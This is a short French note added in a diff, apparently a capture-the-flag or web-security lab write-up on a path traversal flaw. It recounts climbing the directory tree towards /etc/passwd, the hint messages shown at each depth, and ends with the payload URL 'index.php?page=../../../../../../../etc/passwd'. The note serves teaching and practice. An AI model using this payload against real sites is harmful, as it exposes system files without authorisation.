@@ -1,0 +1,12 @@
+On essaie de remonter dans l'arborescence vers /etc/passwd
+
+au fur et a mesure que l'on remonte on nous donne des indices sous formes d'alertes :
+(au lieu du WTF! habituel)
+Wrong..
+Nope..
+Almost
+Still nope..
+Nope..	
+
+IP/index.php?page=../../../../../../../etc/passwd
+
